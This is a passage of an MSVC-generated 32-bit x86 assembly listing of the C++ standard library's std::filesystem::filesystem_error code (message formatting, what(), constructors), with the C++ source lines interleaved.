??1filesystem_error@filesystem@std@@UAE@XZ ENDP		; std::filesystem::filesystem_error::~filesystem_error
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ?_Pretty_message@filesystem_error@filesystem@std@@CA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@3@V?$basic_string_view@DU?$char_traits@D@std@@@3@ABVpath@23@1@Z
_TEXT	SEGMENT
$T1 = -152						; size = 8
$T2 = -144						; size = 8
$T3 = -136						; size = 8
$T4 = -128						; size = 8
$T5 = -120						; size = 8
$T6 = -112						; size = 8
tv134 = -104						; size = 4
tv128 = -100						; size = 4
tv84 = -96						; size = 4
tv78 = -92						; size = 4
tv143 = -88						; size = 4
__Code_page$ = -84					; size = 4
$T7 = -78						; size = 1
$T8 = -77						; size = 1
__Path1_str$ = -76					; size = 24
__Path2_str$ = -52					; size = 24
__Result$ = -28						; size = 24
__$ArrayPad$ = -4					; size = 4
___$ReturnUdt$ = 8					; size = 4
__Op$ = 12						; size = 8
__Path1$ = 20						; size = 4
__Path2$ = 24						; size = 4
?_Pretty_message@filesystem_error@filesystem@std@@CA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@3@V?$basic_string_view@DU?$char_traits@D@std@@@3@ABVpath@23@1@Z PROC ; std::filesystem::filesystem_error::_Pretty_message, COMDAT

; 1791 :         static string _Pretty_message(const string_view _Op, const path& _Path1, const path& _Path2 = {}) {

  00000	53		 push	 ebx
  00001	8b dc		 mov	 ebx, esp
  00003	83 ec 08	 sub	 esp, 8
  00006	83 e4 f8	 and	 esp, -8			; fffffff8H
  00009	83 c4 04	 add	 esp, 4
  0000c	55		 push	 ebp
  0000d	8b 6b 04	 mov	 ebp, DWORD PTR [ebx+4]
  00010	89 6c 24 04	 mov	 DWORD PTR [esp+4], ebp
  00014	8b ec		 mov	 ebp, esp
  00016	81 ec 9c 00 00
	00		 sub	 esp, 156		; 0000009cH
  0001c	a1 00 00 00 00	 mov	 eax, DWORD PTR ___security_cookie
  00021	33 c5		 xor	 eax, ebp
  00023	89 45 fc	 mov	 DWORD PTR __$ArrayPad$[ebp], eax
  00026	56		 push	 esi

; 1792 :             string _Result;

  00027	8d 4d e4	 lea	 ecx, DWORD PTR __Result$[ebp]
  0002a	e8 00 00 00 00	 call	 ??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >

; 1793 :             // Convert the paths to narrow encoding in a way that gracefully handles non-encodable characters
; 1794 :             const auto _Code_page   = __std_fs_code_page();

  0002f	e8 00 00 00 00	 call	 ___std_fs_code_page@0
  00034	89 45 ac	 mov	 DWORD PTR __Code_page$[ebp], eax

; 1795 :             const string _Path1_str = _Convert_wide_to_narrow_replace_chars<char_traits<char>>(

  00037	8d 4d b3	 lea	 ecx, DWORD PTR $T8[ebp]
  0003a	e8 00 00 00 00	 call	 ??0?$allocator@D@std@@QAE@XZ ; std::allocator<char>::allocator<char>
  0003f	89 45 a0	 mov	 DWORD PTR tv84[ebp], eax
  00042	8b 4b 14	 mov	 ecx, DWORD PTR __Path1$[ebx]
  00045	e8 00 00 00 00	 call	 ?native@path@filesystem@std@@QBEABV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@3@XZ ; std::filesystem::path::native
  0004a	89 45 a4	 mov	 DWORD PTR tv78[ebp], eax
  0004d	8d 45 80	 lea	 eax, DWORD PTR $T4[ebp]
  00050	50		 push	 eax
  00051	8b 4d a4	 mov	 ecx, DWORD PTR tv78[ebp]
  00054	e8 00 00 00 00	 call	 ??B?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QBE?AV?$basic_string_view@_WU?$char_traits@_W@std@@@1@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::operator std::basic_string_view<wchar_t,std::char_traits<wchar_t> >
  00059	8b 08		 mov	 ecx, DWORD PTR [eax]
  0005b	8b 50 04	 mov	 edx, DWORD PTR [eax+4]
  0005e	89 4d 90	 mov	 DWORD PTR $T6[ebp], ecx
  00061	89 55 94	 mov	 DWORD PTR $T6[ebp+4], edx
  00064	8b 45 a0	 mov	 eax, DWORD PTR tv84[ebp]
  00067	50		 push	 eax
  00068	8b 4d 94	 mov	 ecx, DWORD PTR $T6[ebp+4]
  0006b	51		 push	 ecx
  0006c	8b 55 90	 mov	 edx, DWORD PTR $T6[ebp]
  0006f	52		 push	 edx
  00070	8b 45 ac	 mov	 eax, DWORD PTR __Code_page$[ebp]
  00073	50		 push	 eax
  00074	8d 4d b4	 lea	 ecx, DWORD PTR __Path1_str$[ebp]
  00077	51		 push	 ecx
  00078	e8 00 00 00 00	 call	 ??$_Convert_wide_to_narrow_replace_chars@U?$char_traits@D@std@@V?$allocator@D@2@@filesystem@std@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@W4__std_code_page@@V?$basic_string_view@_WU?$char_traits@_W@std@@@1@ABV?$allocator@D@1@@Z ; std::filesystem::_Convert_wide_to_narrow_replace_chars<std::char_traits<char>,std::allocator<char> >
  0007d	83 c4 14	 add	 esp, 20			; 00000014H

; 1796 :                 _Code_page, _Path1.native(), allocator<char>{});
; 1797 :             const string _Path2_str = _Convert_wide_to_narrow_replace_chars<char_traits<char>>(

  00080	8d 4d b2	 lea	 ecx, DWORD PTR $T7[ebp]
  00083	e8 00 00 00 00	 call	 ??0?$allocator@D@std@@QAE@XZ ; std::allocator<char>::allocator<char>
  00088	89 45 98	 mov	 DWORD PTR tv134[ebp], eax
  0008b	8b 4b 18	 mov	 ecx, DWORD PTR __Path2$[ebx]
  0008e	e8 00 00 00 00	 call	 ?native@path@filesystem@std@@QBEABV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@3@XZ ; std::filesystem::path::native
  00093	89 45 9c	 mov	 DWORD PTR tv128[ebp], eax
  00096	8d 95 78 ff ff
	ff		 lea	 edx, DWORD PTR $T3[ebp]
  0009c	52		 push	 edx
  0009d	8b 4d 9c	 mov	 ecx, DWORD PTR tv128[ebp]
  000a0	e8 00 00 00 00	 call	 ??B?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QBE?AV?$basic_string_view@_WU?$char_traits@_W@std@@@1@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::operator std::basic_string_view<wchar_t,std::char_traits<wchar_t> >
  000a5	8b 08		 mov	 ecx, DWORD PTR [eax]
  000a7	8b 50 04	 mov	 edx, DWORD PTR [eax+4]
  000aa	89 4d 88	 mov	 DWORD PTR $T5[ebp], ecx
  000ad	89 55 8c	 mov	 DWORD PTR $T5[ebp+4], edx
  000b0	8b 45 98	 mov	 eax, DWORD PTR tv134[ebp]
  000b3	50		 push	 eax
  000b4	8b 4d 8c	 mov	 ecx, DWORD PTR $T5[ebp+4]
  000b7	51		 push	 ecx
  000b8	8b 55 88	 mov	 edx, DWORD PTR $T5[ebp]
  000bb	52		 push	 edx
  000bc	8b 45 ac	 mov	 eax, DWORD PTR __Code_page$[ebp]
  000bf	50		 push	 eax
  000c0	8d 4d cc	 lea	 ecx, DWORD PTR __Path2_str$[ebp]
  000c3	51		 push	 ecx
  000c4	e8 00 00 00 00	 call	 ??$_Convert_wide_to_narrow_replace_chars@U?$char_traits@D@std@@V?$allocator@D@2@@filesystem@std@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@W4__std_code_page@@V?$basic_string_view@_WU?$char_traits@_W@std@@@1@ABV?$allocator@D@1@@Z ; std::filesystem::_Convert_wide_to_narrow_replace_chars<std::char_traits<char>,std::allocator<char> >
  000c9	83 c4 14	 add	 esp, 20			; 00000014H

; 1798 :                 _Code_page, _Path2.native(), allocator<char>{});
; 1799 :             _Result.reserve(_Op.size() + (_Path2_str.empty() ? 4 : 8) + _Path1_str.size() + _Path2_str.size());

  000cc	8d 4d cc	 lea	 ecx, DWORD PTR __Path2_str$[ebp]
  000cf	e8 00 00 00 00	 call	 ?empty@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QBE_NXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::empty
  000d4	0f b6 d0	 movzx	 edx, al
  000d7	85 d2		 test	 edx, edx
  000d9	74 09		 je	 SHORT $LN4@Pretty_mes
  000db	c7 45 a8 04 00
	00 00		 mov	 DWORD PTR tv143[ebp], 4
  000e2	eb 07		 jmp	 SHORT $LN5@Pretty_mes
$LN4@Pretty_mes:
  000e4	c7 45 a8 08 00
	00 00		 mov	 DWORD PTR tv143[ebp], 8
$LN5@Pretty_mes:
  000eb	8d 4b 0c	 lea	 ecx, DWORD PTR __Op$[ebx]
  000ee	e8 00 00 00 00	 call	 ?size@?$basic_string_view@DU?$char_traits@D@std@@@std@@QBEIXZ ; std::basic_string_view<char,std::char_traits<char> >::size
  000f3	8b f0		 mov	 esi, eax
  000f5	03 75 a8	 add	 esi, DWORD PTR tv143[ebp]
  000f8	8d 4d b4	 lea	 ecx, DWORD PTR __Path1_str$[ebp]
  000fb	e8 00 00 00 00	 call	 ?size@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QBEIXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::size
  00100	03 f0		 add	 esi, eax
  00102	8d 4d cc	 lea	 ecx, DWORD PTR __Path2_str$[ebp]
  00105	e8 00 00 00 00	 call	 ?size@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QBEIXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::size
  0010a	03 f0		 add	 esi, eax
  0010c	56		 push	 esi
  0010d	8d 4d e4	 lea	 ecx, DWORD PTR __Result$[ebp]
  00110	e8 00 00 00 00	 call	 ?reserve@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEXI@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::reserve

; 1800 :             _Result += _Op;

  00115	8d 43 0c	 lea	 eax, DWORD PTR __Op$[ebx]
  00118	50		 push	 eax
  00119	8d 4d e4	 lea	 ecx, DWORD PTR __Result$[ebp]
  0011c	e8 00 00 00 00	 call	 ??$?YV?$basic_string_view@DU?$char_traits@D@std@@@std@@$0A@@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV01@ABV?$basic_string_view@DU?$char_traits@D@std@@@1@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::operator+=<std::basic_string_view<char,std::char_traits<char> >,0>

; 1801 :             _Result += R"(: ")"sv; // 3 chars

  00121	6a 03		 push	 3
  00123	68 00 00 00 00	 push	 OFFSET ??_C@_03NONCDIOG@?3?5?$CC@
  00128	8d 8d 70 ff ff
	ff		 lea	 ecx, DWORD PTR $T2[ebp]
  0012e	51		 push	 ecx
  0012f	e8 00 00 00 00	 call	 ??__Ksv@string_view_literals@literals@std@@YA?AV?$basic_string_view@DU?$char_traits@D@std@@@3@PBDI@Z ; std::literals::string_view_literals::operator "" sv
  00134	83 c4 0c	 add	 esp, 12			; 0000000cH
  00137	50		 push	 eax
  00138	8d 4d e4	 lea	 ecx, DWORD PTR __Result$[ebp]
  0013b	e8 00 00 00 00	 call	 ??$?YV?$basic_string_view@DU?$char_traits@D@std@@@std@@$0A@@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV01@ABV?$basic_string_view@DU?$char_traits@D@std@@@1@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::operator+=<std::basic_string_view<char,std::char_traits<char> >,0>

; 1802 :             _Result += _Path1_str;

  00140	8d 55 b4	 lea	 edx, DWORD PTR __Path1_str$[ebp]
  00143	52		 push	 edx
  00144	8d 4d e4	 lea	 ecx, DWORD PTR __Result$[ebp]
  00147	e8 00 00 00 00	 call	 ??Y?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV01@ABV01@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::operator+=

; 1803 :             if (!_Path2_str.empty()) {

  0014c	8d 4d cc	 lea	 ecx, DWORD PTR __Path2_str$[ebp]
  0014f	e8 00 00 00 00	 call	 ?empty@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QBE_NXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::empty
  00154	0f b6 c0	 movzx	 eax, al
  00157	85 c0		 test	 eax, eax
  00159	75 2b		 jne	 SHORT $LN2@Pretty_mes

; 1804 :                 _Result += R"(", ")"sv; // 4 chars

  0015b	6a 04		 push	 4
  0015d	68 00 00 00 00	 push	 OFFSET ??_C@_04PHMHGEMA@?$CC?0?5?$CC@
  00162	8d 8d 68 ff ff
	ff		 lea	 ecx, DWORD PTR $T1[ebp]
  00168	51		 push	 ecx
  00169	e8 00 00 00 00	 call	 ??__Ksv@string_view_literals@literals@std@@YA?AV?$basic_string_view@DU?$char_traits@D@std@@@3@PBDI@Z ; std::literals::string_view_literals::operator "" sv
  0016e	83 c4 0c	 add	 esp, 12			; 0000000cH
  00171	50		 push	 eax
  00172	8d 4d e4	 lea	 ecx, DWORD PTR __Result$[ebp]
  00175	e8 00 00 00 00	 call	 ??$?YV?$basic_string_view@DU?$char_traits@D@std@@@std@@$0A@@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV01@ABV?$basic_string_view@DU?$char_traits@D@std@@@1@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::operator+=<std::basic_string_view<char,std::char_traits<char> >,0>

; 1805 :                 _Result += _Path2_str;

  0017a	8d 55 cc	 lea	 edx, DWORD PTR __Path2_str$[ebp]
  0017d	52		 push	 edx
  0017e	8d 4d e4	 lea	 ecx, DWORD PTR __Result$[ebp]
  00181	e8 00 00 00 00	 call	 ??Y?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV01@ABV01@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::operator+=
$LN2@Pretty_mes:

; 1806 :             }
; 1807 :             _Result += '"'; // 1 char

  00186	6a 22		 push	 34			; 00000022H
  00188	8d 4d e4	 lea	 ecx, DWORD PTR __Result$[ebp]
  0018b	e8 00 00 00 00	 call	 ??Y?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV01@D@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::operator+=

; 1808 :             return _Result;

  00190	8d 45 e4	 lea	 eax, DWORD PTR __Result$[ebp]
  00193	50		 push	 eax
  00194	8b 4b 08	 mov	 ecx, DWORD PTR ___$ReturnUdt$[ebx]
  00197	e8 00 00 00 00	 call	 ??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@$$QAV01@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
  0019c	8d 4d cc	 lea	 ecx, DWORD PTR __Path2_str$[ebp]
  0019f	e8 00 00 00 00	 call	 ??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
  001a4	8d 4d b4	 lea	 ecx, DWORD PTR __Path1_str$[ebp]
  001a7	e8 00 00 00 00	 call	 ??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
  001ac	8d 4d e4	 lea	 ecx, DWORD PTR __Result$[ebp]
  001af	e8 00 00 00 00	 call	 ??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
  001b4	8b 43 08	 mov	 eax, DWORD PTR ___$ReturnUdt$[ebx]

; 1809 :         }

  001b7	5e		 pop	 esi
  001b8	8b 4d fc	 mov	 ecx, DWORD PTR __$ArrayPad$[ebp]
  001bb	33 cd		 xor	 ecx, ebp
  001bd	e8 00 00 00 00	 call	 @__security_check_cookie@4
  001c2	8b e5		 mov	 esp, ebp
  001c4	5d		 pop	 ebp
  001c5	8b e3		 mov	 esp, ebx
  001c7	5b		 pop	 ebx
  001c8	c3		 ret	 0
?_Pretty_message@filesystem_error@filesystem@std@@CA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@3@V?$basic_string_view@DU?$char_traits@D@std@@@3@ABVpath@23@1@Z ENDP ; std::filesystem::filesystem_error::_Pretty_message
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ?what@filesystem_error@filesystem@std@@UBEPBDXZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?what@filesystem_error@filesystem@std@@UBEPBDXZ PROC	; std::filesystem::filesystem_error::what, COMDAT
; _this$ = ecx

; 1786 :         _NODISCARD const char* what() const noexcept override {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 1787 :             return _What.c_str();

  00007	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000a	83 c1 44	 add	 ecx, 68			; 00000044H
  0000d	e8 00 00 00 00	 call	 ?c_str@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QBEPBDXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::c_str

; 1788 :         }

  00012	8b e5		 mov	 esp, ebp
  00014	5d		 pop	 ebp
  00015	c3		 ret	 0
?what@filesystem_error@filesystem@std@@UBEPBDXZ ENDP	; std::filesystem::filesystem_error::what
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ??0filesystem_error@filesystem@std@@QAE@ABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@ABVpath@12@Verror_code@2@@Z
_TEXT	SEGMENT
tv87 = -36						; size = 4
_this$ = -32						; size = 4
$T1 = -28						; size = 24
__$ArrayPad$ = -4					; size = 4
__Message$ = 8						; size = 4
__Path1_arg$ = 12					; size = 4
__Errcode$ = 16						; size = 8
??0filesystem_error@filesystem@std@@QAE@ABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@ABVpath@12@Verror_code@2@@Z PROC ; std::filesystem::filesystem_error::filesystem_error, COMDAT
; _this$ = ecx

; 1771 :               _What(_Pretty_message(runtime_error::what(), _Path1_arg)) {}

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 24	 sub	 esp, 36			; 00000024H
  00006	a1 00 00 00 00	 mov	 eax, DWORD PTR ___security_cookie
  0000b	33 c5		 xor	 eax, ebp
  0000d	89 45 fc	 mov	 DWORD PTR __$ArrayPad$[ebp], eax
  00010	56		 push	 esi
  00011	89 4d e0	 mov	 DWORD PTR _this$[ebp], ecx

; 1770 :             : system_error(_Errcode, _Message), _Path1(_Path1_arg), _Path2(),

  00014	8b 45 08	 mov	 eax, DWORD PTR __Message$[ebp]
  00017	50		 push	 eax
  00018	8b 4d 14	 mov	 ecx, DWORD PTR __Errcode$[ebp+4]
  0001b	51		 push	 ecx
  0001c	8b 55 10	 mov	 edx, DWORD PTR __Errcode$[ebp]
  0001f	52		 push	 edx
  00020	8b 4d e0	 mov	 ecx, DWORD PTR _this$[ebp]
  00023	e8 00 00 00 00	 call	 ??0system_error@std@@QAE@Verror_code@1@ABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z ; std::system_error::system_error

; 1771 :               _What(_Pretty_message(runtime_error::what(), _Path1_arg)) {}

  00028	8b 45 e0	 mov	 eax, DWORD PTR _this$[ebp]
  0002b	c7 00 00 00 00
	00		 mov	 DWORD PTR [eax], OFFSET ??_7filesystem_error@filesystem@std@@6B@

; 1770 :             : system_error(_Errcode, _Message), _Path1(_Path1_arg), _Path2(),

  00031	8b 4d e0	 mov	 ecx, DWORD PTR _this$[ebp]
  00034	83 c1 14	 add	 ecx, 20			; 00000014H
  00037	89 4d dc	 mov	 DWORD PTR tv87[ebp], ecx
  0003a	8b 55 0c	 mov	 edx, DWORD PTR __Path1_arg$[ebp]
  0003d	52		 push	 edx
  0003e	8b 4d dc	 mov	 ecx, DWORD PTR tv87[ebp]
  00041	e8 00 00 00 00	 call	 ??0path@filesystem@std@@QAE@ABV012@@Z ; std::filesystem::path::path
  00046	33 c0		 xor	 eax, eax
  00048	8b 4d e0	 mov	 ecx, DWORD PTR _this$[ebp]
  0004b	83 c1 2c	 add	 ecx, 44			; 0000002cH
  0004e	89 01		 mov	 DWORD PTR [ecx], eax
  00050	89 41 04	 mov	 DWORD PTR [ecx+4], eax
  00053	89 41 08	 mov	 DWORD PTR [ecx+8], eax
  00056	89 41 0c	 mov	 DWORD PTR [ecx+12], eax
  00059	89 41 10	 mov	 DWORD PTR [ecx+16], eax
  0005c	89 41 14	 mov	 DWORD PTR [ecx+20], eax
  0005f	8b 4d e0	 mov	 ecx, DWORD PTR _this$[ebp]
  00062	83 c1 2c	 add	 ecx, 44			; 0000002cH
  00065	e8 00 00 00 00	 call	 ??0path@filesystem@std@@QAE@XZ ; std::filesystem::path::path

; 1771 :               _What(_Pretty_message(runtime_error::what(), _Path1_arg)) {}

  0006a	33 d2		 xor	 edx, edx
  0006c	89 55 e4	 mov	 DWORD PTR $T1[ebp], edx
  0006f	89 55 e8	 mov	 DWORD PTR $T1[ebp+4], edx
  00072	89 55 ec	 mov	 DWORD PTR $T1[ebp+8], edx
  00075	89 55 f0	 mov	 DWORD PTR $T1[ebp+12], edx
  00078	89 55 f4	 mov	 DWORD PTR $T1[ebp+16], edx
  0007b	89 55 f8	 mov	 DWORD PTR $T1[ebp+20], edx
  0007e	8d 4d e4	 lea	 ecx, DWORD PTR $T1[ebp]
  00081	e8 00 00 00 00	 call	 ??0path@filesystem@std@@QAE@XZ ; std::filesystem::path::path
  00086	8d 45 e4	 lea	 eax, DWORD PTR $T1[ebp]
  00089	50		 push	 eax
  0008a	8b 4d 0c	 mov	 ecx, DWORD PTR __Path1_arg$[ebp]
  0008d	51		 push	 ecx
  0008e	83 ec 08	 sub	 esp, 8
  00091	8b f4		 mov	 esi, esp
  00093	8b 4d e0	 mov	 ecx, DWORD PTR _this$[ebp]
  00096	e8 00 00 00 00	 call	 ?what@exception@std@@UBEPBDXZ ; std::exception::what
  0009b	50		 push	 eax
  0009c	8b ce		 mov	 ecx, esi
  0009e	e8 00 00 00 00	 call	 ??0?$basic_string_view@DU?$char_traits@D@std@@@std@@QAE@QBD@Z ; std::basic_string_view<char,std::char_traits<char> >::basic_string_view<char,std::char_traits<char> >
  000a3	8b 55 e0	 mov	 edx, DWORD PTR _this$[ebp]
  000a6	83 c2 44	 add	 edx, 68			; 00000044H
  000a9	52		 push	 edx
  000aa	e8 00 00 00 00	 call	 ?_Pretty_message@filesystem_error@filesystem@std@@CA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@3@V?$basic_string_view@DU?$char_traits@D@std@@@3@ABVpath@23@1@Z ; std::filesystem::filesystem_error::_Pretty_message
  000af	83 c4 14	 add	 esp, 20			; 00000014H
  000b2	8d 4d e4	 lea	 ecx, DWORD PTR $T1[ebp]
  000b5	e8 00 00 00 00	 call	 ??1path@filesystem@std@@QAE@XZ ; std::filesystem::path::~path
  000ba	8b 45 e0	 mov	 eax, DWORD PTR _this$[ebp]
  000bd	5e		 pop	 esi
  000be	8b 4d fc	 mov	 ecx, DWORD PTR __$ArrayPad$[ebp]
  000c1	33 cd		 xor	 ecx, ebp
  000c3	e8 00 00 00 00	 call	 @__security_check_cookie@4
  000c8	8b e5		 mov	 esp, ebp
  000ca	5d		 pop	 ebp
  000cb	c2 10 00	 ret	 16			; 00000010H
??0filesystem_error@filesystem@std@@QAE@ABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@ABVpath@12@Verror_code@2@@Z ENDP ; std::filesystem::filesystem_error::filesystem_error
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ??0filesystem_error@filesystem@std@@QAE@ABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@Verror_code@2@@Z
_TEXT	SEGMENT
tv135 = -8						; size = 4
_this$ = -4						; size = 4
__Message$ = 8						; size = 4
__Errcode$ = 12						; size = 8
??0filesystem_error@filesystem@std@@QAE@ABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@Verror_code@2@@Z PROC ; std::filesystem::filesystem_error::filesystem_error, COMDAT
; _this$ = ecx

; 1766 :         filesystem_error(const string& _Message, const error_code _Errcode)

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8
  00006	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 1767 :             : system_error(_Errcode, _Message), _What(runtime_error::what()) {}

  00009	8b 45 08	 mov	 eax, DWORD PTR __Message$[ebp]
  0000c	50		 push	 eax
  0000d	8b 4d 10	 mov	 ecx, DWORD PTR __Errcode$[ebp+4]
  00010	51		 push	 ecx
  00011	8b 55 0c	 mov	 edx, DWORD PTR __Errcode$[ebp]
  00014	52		 push	 edx
  00015	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00018	e8 00 00 00 00	 call	 ??0system_error@std@@QAE@Verror_code@1@ABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z ; std::system_error::system_error
  0001d	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00020	c7 00 00 00 00
	00		 mov	 DWORD PTR [eax], OFFSET ??_7filesystem_error@filesystem@std@@6B@
  00026	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00029	83 c1 14	 add	 ecx, 20			; 00000014H
  0002c	e8 00 00 00 00	 call	 ??0path@filesystem@std@@QAE@XZ ; std::filesystem::path::path
  00031	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00034	83 c1 2c	 add	 ecx, 44			; 0000002cH
  00037	e8 00 00 00 00	 call	 ??0path@filesystem@std@@QAE@XZ ; std::filesystem::path::path
  0003c	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0003f	83 c1 44	 add	 ecx, 68			; 00000044H
  00042	89 4d f8	 mov	 DWORD PTR tv135[ebp], ecx
  00045	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00048	e8 00 00 00 00	 call	 ?what@exception@std@@UBEPBDXZ ; std::exception::what
  0004d	50		 push	 eax
  0004e	8b 4d f8	 mov	 ecx, DWORD PTR tv135[ebp]
  00051	e8 00 00 00 00	 call	 ??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@QBD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
  00056	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00059	8b e5		 mov	 esp, ebp
  0005b	5d		 pop	 ebp
  0005c	c2 0c 00	 ret	 12			; 0000000cH
??0filesystem_error@filesystem@std@@QAE@ABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@Verror_code@2@@Z ENDP ; std::filesystem::filesystem_error::filesystem_error
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ??$?_0V?$basic_string_view@_WU?$char_traits@_W@std@@@std@@$0A@@path@filesystem@std@@QAEAAV012@ABV?$basic_string_view@_WU?$char_traits@_W@std@@@2@@Z
_TEXT	SEGMENT
$T1 = -36						; size = 4
_this$ = -32						; size = 4
$T2 = -28						; size = 24
__$ArrayPad$ = -4					; size = 4
__Source$ = 8						; size = 4
??$?_0V?$basic_string_view@_WU?$char_traits@_W@std@@@std@@$0A@@path@filesystem@std@@QAEAAV012@ABV?$basic_string_view@_WU?$char_traits@_W@std@@@2@@Z PROC ; std::filesystem::path::operator/=<std::basic_string_view<wchar_t,std::char_traits<wchar_t> >,0>, COMDAT
; _this$ = ecx

; 779  :         path& operator/=(const _Src& _Source) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 24	 sub	 esp, 36			; 00000024H
  00006	a1 00 00 00 00	 mov	 eax, DWORD PTR ___security_cookie
  0000b	33 c5		 xor	 eax, ebp
  0000d	89 45 fc	 mov	 DWORD PTR __$ArrayPad$[ebp], eax
  00010	89 4d e0	 mov	 DWORD PTR _this$[ebp], ecx

; 780  :             return operator/=(path{_Source});

  00013	6a 00		 push	 0
  00015	8b 45 08	 mov	 eax, DWORD PTR __Source$[ebp]
  00018	50		 push	 eax
  00019	8d 4d e4	 lea	 ecx, DWORD PTR $T2[ebp]
  0001c	e8 00 00 00 00	 call	 ??$?0V?$basic_string_view@_WU?$char_traits@_W@std@@@std@@$0A@@path@filesystem@std@@QAE@ABV?$basic_string_view@_WU?$char_traits@_W@std@@@2@W4format@012@@Z ; std::filesystem::path::path<std::basic_string_view<wchar_t,std::char_traits<wchar_t> >,0>
